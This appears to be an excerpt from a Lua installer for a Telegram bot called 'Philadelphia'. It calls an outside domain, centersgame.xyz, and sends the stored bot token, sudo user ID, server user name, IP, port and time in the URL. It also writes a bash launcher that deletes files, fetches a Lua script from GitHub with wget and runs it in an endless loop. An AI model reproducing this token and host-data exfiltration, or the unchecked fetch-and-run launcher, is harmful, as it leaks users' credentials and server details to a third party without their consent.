...
data,res = https.request("https://Philadelphia-source.tk/PhiladelphiaTeAM/index.php?bn=info&id="..Id)
if res == 200 then
...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://centersgame.xyz/PhiladelphiaSource/Philadelphia-Sourcepl.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Philadelphia::")
local RunBot = io.open("Philadelphia", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/Philadelphia
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr Philadelphia.lua
wget "https://raw.githubusercontent.com/Philadelphia/Philadelphia/master/Philadelphia.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Philadelphia.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S Philadelphia -X kill
screen -S Philadelphia ./Philadelphia
done
]])
RunTs:close()
end
